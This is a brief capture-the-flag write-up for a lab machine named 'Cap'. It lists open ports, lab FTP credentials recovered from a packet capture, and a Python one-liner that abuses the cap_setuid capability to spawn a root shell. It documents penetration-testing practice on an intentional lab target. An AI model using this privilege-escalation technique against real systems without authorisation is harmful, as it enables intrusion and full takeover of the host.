# Cap

### Exploitation

- port 21/tcp FTP vsftpd 3.0.3
- port 22/tcp SSH OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
- port 80/tcp HTTP gunicorn

/data/0 contains a pcap file of ftp login information

nathan:Buck3tH4TF0RM3!

### Exploitation

FTP credentials found in /data/0 give us access to the user.txt file and SSH login

### Privilege Escalation

Running linpeas.sh shows that python 3.8 has the cap_setuid, cap_net_bind_service+eip capabilities, allowing 
us to spawn root shells with the following command:

`/usr/bin/python3.8 -c 'import os;os.setuid(0);os.system("/bin/bash")'`
